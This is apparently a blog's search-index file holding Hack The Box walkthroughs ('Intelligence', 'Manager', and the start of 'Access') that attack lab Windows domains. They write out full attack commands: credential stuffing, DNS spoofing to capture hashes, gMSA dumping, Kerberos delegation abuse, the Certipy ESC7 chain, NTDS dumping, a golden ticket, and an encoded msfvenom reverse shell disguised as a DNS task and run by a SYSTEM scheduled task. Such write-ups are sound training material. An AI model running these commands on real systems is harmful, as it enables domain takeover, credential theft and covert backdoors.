SAM names \u0026amp; a total user count of 31 users that we have extracted. Command Breakdown exiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it’s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt 2. Foothold: Credential Stuffing with netexec: Credential Stuffing: netexec smb $box -u userList.txt -p $pass --shares --continue-on-success | grep [+] We get a hit: We can see she has access to some interesting shares, namely IT, Users \u0026amp; Sysvol. Credentialed SMB Enumeration: Enumerating Users Share: Connecting to the users share I find it is as it says a list of user directories: I get the user.txt flag: I check the SYSVOL share but there is nothing of note there. I also asreproasted \u0026amp; kerberoasted using netexec, nothing of note. I checked the NETLOGON share. I also tried secrets-dump (sometimes great to do with a low-priv account as you never know what you will get) Finding a user script: I connect to the IT share and find a file called downdetector.ps1 Looking at the script it checks if any hosts with a DNS name that starts with web are down every 5 minutes and then emails Ted.Graves. What using is particularly interesting about this though is that it sends a Credentialed Request using the user Ted.Graves -UseDefaultCredentials to each of the entries; meaning if we can get it to try to authenticate to us by adding a fake DNS entry we can potentially grab Ted.Graves credentials!!! As he is receiving these emails we can safely assume he is either part of IT or networking (plus this is probably the script that was referenced in the PDF\u0026rsquo;s we pulled). 3. Lateral Movement \u0026amp; Privilege Escalation: Adding a Malicious DNS Entry using dnstool.py: We can use the tool dnstool which is part of krbrelayx .\nThis tool enables us to \u0026ldquo;Add/modify/delete Active Directory Integrated DNS records via LDAP.\u0026rdquo; Clone The Repo:\ngit clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx I start responder :\nsudo responder -v -I tun0 I make dns entry:\npython3 dnstool.py $box -u intelligence\\\\$user -p $pass --action add --record web-bloodstiller --data $myip --type A +Note+: It requires the hostname/ip as an argument but there is no flag for it, it just accepts it. We capture a hash for ted.graves:\nWhy can we just add malicious DNS entries to a Domain Controller?: So I had to go searching for this information as I was not sure if this vulnerability was the result of our user Tiffany.Molina having this privilege. There is no evidence she is part of any DNS administration groups: I read some sources saying that by default any authenticated user can add DNS entries in an AD environment. ippsec also states this here Whereas Kevin Robertson (creator of PowerMad \u0026amp; Inveigh ) states:\nModifying ADIDNS Zones There are two primary methods of remotely modifying an ADIDNS zone. The first involves using the RPC based management tools. These tools generally require a DNS administrator or above so I won’t bother describing their capabilities. The second method is DNS dynamic updates. Dynamic updates is a DNS specific protocol designed for modifying DNS zones. Within the AD world, dynamic updates is primarily leveraged by machine accounts to add and update their own DNS records.\nSource: https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/ Cracking Teds Hash using Hashcat: I use hashcat to cracks Ted\u0026rsquo;s password: hashcat -m 5600 ted.hash ~/Wordlists/rockyou.txt Running Bloodhound as Ted Graves: As we have Ted\u0026rsquo;s creds we can run the python collector for bloodhound. python3 bloodhound.py -dc dc.intelligence.htb -c All -u $user -p $pass -d intelligence.htb -ns $box We can see that Ted part of the ITSUPPORT group and this group has the ability to read the GMSAPassword of the host SVC_INT$: Looking further we can see that the host SVC_INT$ has the constrained delegation privilege over the Domain Controller DC.INTELLIGENCE.HTB this gives us a clear attack path as we can perform a constrained delegation attack. Using gMSADumper.py to dump the gMSA Password: I dump the gMSA Password using gMSADumper.py python3 gMSADumper.py -u $user -p $pass -d intelligence.htb The first line is the NTLM hash of the SVC_INT$ machine account. I verify the hash is valid using netexec:\nnetexec smb $box -u svc_int$ -H $hash --shares What is gMSA \u0026amp; gMSA Password?: gMSA (Group Managed Service Account):\nA gMSA is a type of service account in Active Directory that is designed to enhance security and reduce administrative overhead for service accounts. They provide automatic password management \u0026amp; simplified service principal name (SPN) management. The password for a gMSAccount is a gMSA password:\nThey are automatically generated by Active Directory \u0026amp; 240 characters long !!! So not even worth trying to crack They are automatically rotated regularly: (default is 30 days) They are not known or accessible to administrators. Some further points about gMSA passwords:\nThey eliminate the need for manual password resets as they are handled by the system. The password is managed by the domain controllers Authorized hosts can retrieve the current password when needed This approach significantly reduces the risk of password-related security issues 4. Ownership: 1. Clock Synchronization To Ensure Kerberos Tickets Are Valid: Sync The Clock of our Attack Host with the Target:\nI sync my clock with the host, this is crucially important as Kerberos has time based checks when authorizing we need to ensure our times our synced with our target. The error you will see if your clock is not synced: If you are on kali do the following:\nsudo apt install ntpdate Ensure that you have the host in your /etc/hosts file \u0026amp; then run: sudo ntpdate -s intelligence.htb this will sync your clocks. 2. Kerberos Constrained Delegation (KCD) Attack: I launch the constrained delegation attack: impacket-getST -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int' -impersonate Administrator -dc-ip $box -hashes :$hash Despite getting a lot of errors I still get a .cacche file. Constrained Delegation KCD Attack Explained: Compromise a Service Account:\nWe need to gain control of a service account that has been configured for constrained delegation. We have control over svc_int$ computer account Identify Delegation Targets:\nEnumerates the services which our compromised account is allowed to delegate to. We know we can delegate to WWW/dc.intelligence.htb which is a service running on the Domain Controller Request a TGT: Handled by impacket-getST\nWe requests a Ticket Granting Ticket (TGT) for the compromised service account. Request a Service Ticket: impacket-getST\nUsing the TGT, the we requests a service ticket for one of the allowed delegation targets. We specify the user they want to impersonate in this case it will be the Administrator account. S4U2Self: impacket-getST\nThe Key Distribution Center (KDC) performs an S4U2Self (Service for User to Self) operation. This creates a service ticket as if the impersonated user (Administrator) had requested it. S4U2Proxy: impacket-getST\nThe KDC then performs an S4U2Proxy (Service for User to Proxy) operation. This allows the service ticket to be used for delegation to the target service. Access Target Service:\nWe can now use this ticket to access the target service, appearing as the impersonated user. 3. Load the .ccache into memory with the KRB5CCNAME variable: First I rename the .ccache:\n+Note+: The only reason I do this is because it\u0026rsquo;s neater visually, there is no other reason to do this other than personal preference, that is all. Load the .ccache into the KRB5CCNAME variable:\nThe KRB5CCNAME environment is variable used by Kerberos 5 (KRB5) as a pointer to the .cacche which actually stores the creds. 4. Getting a shell using impacket-psexec: As we have the KRB5CCNAME variable pointing at our .ccache file we can use kerberos authentication get a shell:\nimpacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass -dc-ip $box -target-ip $box Root flag obtained:\n5. Ownership: Dumping NTDS using netexec and our kerberos credentials: As netexec also allows kerberos authentication we can dump the NTDS database to extract all the hashes from the DC.\nI verify the Administrators hash works by creating starting a session using evil-winrm:\nevil-winrm -i $box -u administrator -H $hash 6. Persistence: Creating a windows scheduled task to enable a backdoor. I understand this is a box but I want to demonstrate how we can achieve persistence:\nI create an obfuscated shell using msfvenom:\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=53 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o dnsTask.exe I use port 53 \u0026amp; call it dnsTask.exe as a way to make it appear like a normal DNS task connecting to a DNS server. I upload this to the target via evil-winrm to C:\\Windows:\nI upload it to the C:\\Windows folder as a further way to make it look authentic. I create a scheduled task to execute my shell every 1 minute:\nschtasks /create /sc minute /mo 1 /tn \u0026quot;dnsTask\u0026quot; /tr C:\\Windows\\dnsTask.exe /ru \u0026quot;SYSTEM\u0026quot; Command Breakdown: schtasks: The command-line utility in Windows used to create, delete, configure, or display scheduled tasks. /create: This option tells schtasks to create a new scheduled task. /sc minute: This specifies the schedule frequency for the task. In this case, it will run every minute. /mo 1: Modifies the frequency (modifier) to occur every 1 minute. /tn \u0026quot;dns\u0026quot;: The task\u0026rsquo;s name is \u0026ldquo;dnsTask\u0026rdquo;. /tr C:\\dnsTask.exe: The task will run the script or command C:\\tools\\shell.cmd. /ru \u0026quot;SYSTEM\u0026quot;: This specifies that the task will run under the SYSTEM\u0026quot;~ user account, which gives it high-level privileges. I start my listener in nc.exe\nnc -nvlp 53 And…..nothing, I believe my shell is being caught by defender. I will need to find another way, but that can wait for another day. Lessons Learned: What did I learn? I learned that users may or may not be able to add DNS entries (super clear I know.) I never had considered using DNS as a means to for spoofing before which was a cool thing to do. What silly mistakes did I make? I didn\u0026rsquo;t specify the SPN the first time when running the KCD attack. I ran bloodhound a little too late. This was mainly due to having issues with bloodhound.py but after setting it up in a venv it was fine. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/intelligence-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/kcd\/": {
        "title": "KCD",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/kcd\/"
    },
    
    "http:\/\/localhost:1313\/tags\/esc7\/": {
        "title": "ESC7",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/esc7\/"
    },
    
    "http:\/\/localhost:1313\/tags\/manager\/": {
        "title": "Manager",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/manager\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/manager-box\/": {
        "title": "Manager HTB Walkthrough",
        "tags": ["Box","HTB","Manager","Windows","LDAP","kerberos","SMB","MSSQL","Certificate","CA","ESC7",],
        "content": "Hack The Box Manager Walkthrough/Writeup: https://app.hackthebox.com/machines/Manager How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan Host is up (0.040s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl This scan already gives us a lot to go off of.\nWe can see that numerous services are running: What is telling is that port 53 is running, which means this host is running it\u0026rsquo;s own DNS service, which would indicate that it\u0026rsquo;s running as a server or even a DC. We can also see that it\u0026rsquo;s running 88 kerberos \u0026amp; 389,3268,3269 ldap/ldapssl which again indicates it\u0026rsquo;s a server/DC. We also have 1433 MSSQL running. Lots of interesting things. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP We can see the host is called DC01 which lets us know this is a high-value target as it\u0026rsquo;s a domain controller. Web 80: Looking at the website, it appears to be running a content writing service:\nWappalyzer doesn\u0026rsquo;t give any additional information regarding the underlying software stack being used.\nI check the \u0026ldquo;contact\u0026rdquo; page for injection as it has a submission form:\nHowever it does not appear to be injectable: I perform some dirbusting with little to no results:\nTip, as soon as you start investigating any websites, ALWAYS proxy them through burp straight away. This way as you are working your way around the site looking for injection points and seeing how the site works and reacts to input you have a log already running. SMB 445: SMB appears to allow us to login via the guest account:\nThere are a number of shares running, but we only have read access to the IPC$ share:\nAs expected there is nothing in it:\nOver view of IPC$ Share: Quick overview if you are unfamiliar with the IPC$ share: The IPC$ share (Inter-Process Communication) is a special administrative share in Windows which allows communication with programs via Named Pipes: It\u0026rsquo;s mainly used for inter-process communication between hosts over a network. It also enables remote administration of a system, allowing file and print sharing. It\u0026rsquo;s a default share on windows systems. Requires credentials for access, typically used in conjunction with administrative or user rights. But as you can see Guest creds can also work in some instances. It is possible to use IPC$ for enumeration (e.g., enumerating users, shares, groups or services). LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 4GiB/7GiB | 780kiB/1GiB with /usr/bin/zsh 🕙 20:42:31 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.188.216 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=manager,DC=htb CN=Configuration,DC=manager,DC=htb CN=Schema,CN=Configuration,DC=manager,DC=htb DC=DomainDnsZones,DC=manager,DC=htb DC=ForestDnsZones,DC=manager,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=manager,DC=htb ldapServiceName: manager.htb:dc01$@MANAGER.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: That any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. DNS 53: I run DNSenum on the host to find out if there are any interesting entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt manager.htb Unfortunately I get very little from this bar the standard DNS entries present on DC\u0026rsquo;s by default: domaindnszones.manager.htb: Stores DNS records replicated across all domain controllers in the domain. forestdnszones.manager.htb: Stores DNS records replicated across all domain controllers in the forest. gc._msdcs.manager.htb: Used to locate Global Catalog servers for cross-domain queries and authentication. Kerberos 88: As kerberos is open we can also enumerate users, groups and some other information:\nI spin up Kerbrute and pass it a username list from seclists :\nkerbrute userenum -d manager.htb --dc $box ~/Wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\nI use the impacket-lookupsid module to further enumerate groups, users \u0026amp; machine accounts:\nimpacket-lookupsid manager.htb/guest@dc01.manager.htb -domain-sids We find some interesting things here: Standard User accounts built into any DC. Machine account DC01$. All machine accounts are followed by the $ symbol Groups. Non default user accounts. You may also notice that the user ChinHae did not show up in kerbrute this is due to us using brute-forcing to enumerate users in kerbrute where-as with this module we are actively querying the DC for this information. Making a list….checking it once?: There does not seem to be anything obvious and low-hanging that is exploitable. So I am going to try some password spraying, using the users name as their password. If this does not work I will then crawl the site using CeWL to generate a custom password list. I create a password list from their usernames, to avoid complexity I have made all passwords lower-case. netexec smb $box -u Users.txt -p Passwords.txt --no-bruteforce As I currently do not know the password policy (I tried enumerating it but the guest account would not allow me to, nor would LDAP) I used the --no-bruteforce flag which means it will not try all combinations. I get a hit! 2. Foothold: Credentialed SMB Enumeration: I check if we have access to more smb shares with the creds \u0026amp; we do:\nOften the SYSVOL share will be used to hold scripts on a DC so this is a good target to go after.\nSMBClient:\nI check both shares and we cannot list the contents of them: smbclient -U '$user' \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; smbclient -U '$user' \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot; See future bloodstiller note below for why this did not work, it was my syntax!!! SMBMAP:\nTo ensure I am not getting false positives from my tools I also try SMBMAP: smbmap -u '$user' -p '$user' -H $box -r Future Bloodstiller here: This didn\u0026rsquo;t work as I had enclosed my alias\u0026rsquo; in quotations it should have been $user not $user and it would have listed the contents of the shares. However I still did not have access to read items within. Netexec Spidering:\nI try one more tool, netexec and use it to spider, netexec smb $box -u $user -p $user -M spider_plus -o EXCLUDE_DIR=IPC$ We can see from the results that there are files \u0026amp; shares available. I have excluded the IPC$ share from this process as although privesc is possible using this share it\u0026rsquo;s most probably unlikely due to the complexity of the attack \u0026amp; this is a medium rated box. Which means there are files here it just may be that our current user does not have access to them. Credentials MSSQL Enumeration: I check if our credentials are valid for the MSSQL service running \u0026amp; they appear to be:\nI connect using impacket-mssqlclient:\nsudo impacket-mssqlclient manager.htb/$user:$user@$box -windows-auth I go for the easy win of trying to enable xp_cmdshell so we can run commands on the underlying OS but alas we do not have required perms:\nI also try running xp_dirtree to see if I can read files on the underlying OS\nEXEC xp_dirtree 'C:\\', 1, 1;\nWe get a hit! This means we can read files \u0026amp; folders on the underlying OS \u0026amp; there are some interesting folders here already: inetpub (webserver) Recovery (potentially backups) SQL2019 (it\u0026rsquo;s in the name….) Users (….really?) What is xp_dirtree?\nxp_dirtree is a built-in SQL Server stored procedure that lets us list the contents of a directory—whether that’s subfolders, files, or both—without leaving the comfort of SQL. We tell it which folder to start with, how deep to go, and whether we want to see files in addition to folders. Breaking down the command:\nEXEC xp_dirtree \u0026#39;C:\\\u0026#39;, 1, 1; C:: This is the starting point—the directory we want to look into. In this case, we’re starting at the root of the C: drive. 1 (depth): This tells xp_dirtree to only look in the top-level folder, without diving into subdirectories. We can increase this number if we want to see deeper levels. E.G. 2 etc. 1 (file flag): This tells SQL Server to include both files and directories in the result. If you set this to 0, it will only list directories. Finding a website backup: I find a website backup in C:\\inetpub\\wwwroot\nAs this backup is in the actual webroot itself we should be able to retrieve it via wget\nI download it: Finding Hard-coded Credentials: I expand the zip file and immediatley see a file called .old-conf.xml:\nI find hardcoded creds for the user Raven in the file:\nI verify these work with netexec:\nnetexec smb $box -u $user -p $pass --shares Again we see that Raven has access to the same shares as the operator user. Getting access to the system as Raven: I access the host using evil-winrm as Raven:\nUser flag:\n3. Privilege Escalation: Privesc Enumeration: I run WinPEAS and don\u0026rsquo;t get anything too interesting.\nI upload SharpHound.exe via evil-winrm and run a collection:\nLooking at our owned users, we can see that Raven has the Enroll edge/connection to the certificate authority MANAGER-DC01-CA@MANAGER.HTB:\nEnroll Edge Abuse:\nIn bloodhound it does not show us a specific attack path we can take:\nHowever looking at the bloodhound knowledge base for enroll it tells us the following:\nThe Enroll permission grants enrollment rights on the certificate template.\nThe following additional requirements must be met for a principal to be able to enroll a certificate:\nThe certificate template is published on an enterprise CA The principal has Enroll permission on the enterprise CA The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template It also links us to the article Certified_Pre-Owned So from what I can tell this is abuse of the CA as a means to privesc.\nCA Abuse to Privesc: I use Certipy to enumerate for vulnerabilities\ncertipy-ad find -vulnerable -u $user@manager.htb -p $pass -dc-ip $box I did import it into bloodhound, but I\u0026rsquo;ll be honest, I wasn\u0026rsquo;t sure what extra it gave me \u0026amp; as I am running bloodhound in docker I did not add the extra queries. Looking at the output I can see that Raven has dangerous permissions:\nWe can see that the attack path we can take is ESC7\nESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests\nThis means that she has the ManageCA rights over the CA and but utilzing the ESC7 scenario we can elevate our privileges to Domain Admin. We just need to follow the steps as outlined on https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7 :\nESC7 Attack Process Overview (simplified):\nPermissions Setup/Make ourselves an officer on the CA:\nAs we have the ManageCA permission on the Windows domain Certificate Authority (CA). We can also grant ourselves the Manage Certificates permission (using the ManageCA permission). We can add ourselves as an officer with Manage Certificates permission. This permission gives us control to handle certificate requests and issue certificates, even failed ones (that last one is important!) Vulnerable Certificate Template:\nThe SubCA certificate template is vulnerable to exploitation. If it is disabled, we will use our new permissions as an officer to enable it on the CA Making the Certificate Request:\nWe request a certificate using the SubCA template for an admin account (e.g., administrator@manager.htb). Our request will be denied, but we save the private key and note down the request ID. Re-Issuing the Denied Request:\nSince we have Manage Certificates permission, we can issue the previously denied certificate request using the request ID. Retrieving the Certificate:\nFinally, we retrieve the issued certificate and private key for the highly privileged account e.g. domain admin/admin. Result:\nWe now have a valid certificate for a privileged account, allowing us to impersonate that user and escalate our access. Step 1 Add Raven as an Officer, to manage \u0026amp; issue certs: certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -add-officer raven -debug Step 2 Enable SubCA template: Enable SubCA Template:\ncertipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -enable-template SubCA -debug The reason we do this is because:\nThe SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.\nI see this says ESC1 however we are using this cert as only admins can enroll using this cert and we want to privesc to admin. Verify the template has been enabled:\ncertipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -list-templates -debug Step 3 Request a certificate on behalf of the administrator: We request a certificate for the administrator, as expected it is denied: certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb -debug We opt to save it anyway \u0026amp; take a note of the number listed 23 This is the most important part of this whole process. We are setting the UPN (User Principal Name) to be administrator@manager.htb this means we are requesting this ticket on behalf of the administrator user. Step 4 Re-issue our failed cert: We re-issue our failed cert: certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -issue-request 23 -debug Step 5 Retrieve the issued cert and download as .pfx: We request our re-issued cert and download it: certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -retrieve 23 -debug Step 6 Retrieve the Admin Hash: Sync your clock first:\nFor the love all that is HOLY do this before you progress any further!!\nSync your Kali/attack host clock with the box. The reason is if you do not, kerberos will be unhappy and not let you progress. This is a security mechanism. If you see the below error this is most likely down to your attack host clock being too out of sync with the target. If you are on kali do the following:\nsudo apt install ntpdate Ensure that you have the host in your /etc/hosts file \u0026amp; then run: sudo ntpdate -s manager.htb this will sync your clocks. Retrieve Admin Hash!:\ncertipy-ad auth -pfx administrator.pfx Attack Deep-Dive e.g. Exploiting UPNs in ESC7 Attacks: A Hacker\u0026rsquo;s Guide: What\u0026rsquo;s a UPN and Why Do We Care?\nFirst things first: UPN stands for User Principal Name (UPN). They\u0026rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here\u0026rsquo;s why they\u0026rsquo;re so important: They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension. They link certificates to specific Active Directory accounts. They enable certificate mapping for authentication. They facilitate Single Sign-On (SSO) scenarios. They\u0026rsquo;re used in smart card logons. Sometimes, they even correspond to email addresses. The ESC7 Attack: Our Ticket to Domain Admin: The ESC7 attack path all revolves around a misconfigured certificate template.\nWe find a template that lets us specify our own Subject Alternative Name (SAN) when requesting a certificate. SubCA\nWe request a certificate and we specify a UPN of a high-privileged account (like a domain admin) in the certificate\u0026rsquo;s SAN field.\nThe CA will issue us a certificate with our specified UPN, even though it doesn\u0026rsquo;t match our actual identity.\nNow we can authenticate as admin:\nFrom Certificate to Domain Domination:\nBut wait, you might ask, \u0026ldquo;Bloodstiller, how do we actually use this certificate to own the domain?\u0026rdquo; Great question! Here\u0026rsquo;s how we turn our shiny new cert into total control:\nWe present our manipulated certificate to the target system (usually a domain controller).\nThe system checks the cert: Is it valid? Not expired? Issued by a trusted CA?\nAs we have power to issue certs, it\u0026rsquo;s valid - check. We just issued it - check. As CA\u0026rsquo;s be default trust certs issues by themselves - check! Here\u0026rsquo;s where the magic happens: the DC/System extracts the UPN (which we set) from the SAN field of our certificate.\nIt uses this UPN to find the corresponding user account in Active Directory. Remember, this is the admin account we specified, not our actual account!\nIf everything looks good (and why wouldn\u0026rsquo;t it?), the system hands us a Kerberos Ticket Granting Ticket (TGT) for that account.\nBoom! We now have a TGT for a high-privileged account. We can use this ticket to access resources and wreak havoc with admin privileges.\n+Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a .cacche file so we can then perform PTT attacks from the comfort of our attack box. Why This Attack is a Hacker\u0026rsquo;s Dream: It bypasses multi-factor authentication (MFA)!!! No account lockouts to worry about. It\u0026rsquo;s stealthy - often not logged as clearly as failed password attempts. All our actions look like they\u0026rsquo;re coming from the real admin account. 4. Ownership: I login as the admin using their hash: 5. Persistence: My original plan was to craft a golden ticket however for whatever reason it would not work, I tried numerous ways with mimikatz, ruebeus etc but it would always give me the error:\n[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked) it may just be that this host is set to detect Golden Ticket abuse. I did consider doing a diamond exploit, however I need to look more into the process. I have persistence via the hashes of the users below:\nI dump the NTDS db so I can retrieve the krbtgt account hash Process of failed Golden Ticket Attack: In-case anyone can see any glaring issues. If you can hit me up on bloodstiller at proton.me \u0026amp; tell me why I am dumb please. Upload nc.exe \u0026amp; mimikatz via existing administrator evil-winrm session Sync host clock with target clock (this is important!) Start reverse shell: If anyone is wondering why I am creating a reverse shell when I have an evil-winrm shell, it\u0026rsquo;s because mimikatz does not play nice with evil-winrm. Request golden ticket kerberos::golden /domain:manager.htb /user:administrator /sid:S-1-5-21-4078382237-1492182817-2568127209-500 /krbtgt:b5edce70e6c1efa075f14bcf5231f79a Download ticket.kirbi Convert ticket.kirbi to .cacche for use on linux. Import .ccache file into KRB5CCNAME variable Run klist to ensure ticket is imported variable. As we can see this ticket is valid for 10 years: I also tried appending the specific user SID for admin of 500 \u0026amp; also using a lower-case administrator. Run impacket-psexec: Lessons Learned: What did I learn? I learned alot about certificate attacks, I had done very little on them previously so this was nice to get done. I learned about golden ticket attacks being thwarted…… What silly mistakes did I make? Enclosing my user \u0026amp; password vars in quotations marks rendering them USELESS! We live and learn The standard not updating /etc/hosts when doing LDAP queries etc. Oh here is a fun one, I spent a good amount of time trying to exfil the website backup before realizing it was in-fact in the webroot and I could just wget it. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/manager-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/smb\/": {
        "title": "SMB",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/smb\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/access-box\/": {
        "title": "Access HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","pst","lnk","telnet","Active Directory",],
        "content": "Access Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Access How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Simple NMAP to get a view of low hanging fruit: kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:30:03 zsh ❯ nmap $box -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST Nmap scan report for 10.129.199.196 Host is up (0.056s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds Advanced All Ports NMAP Scan: kali in 46-Boxes/46.02-HTB/Access/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:29:41 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box 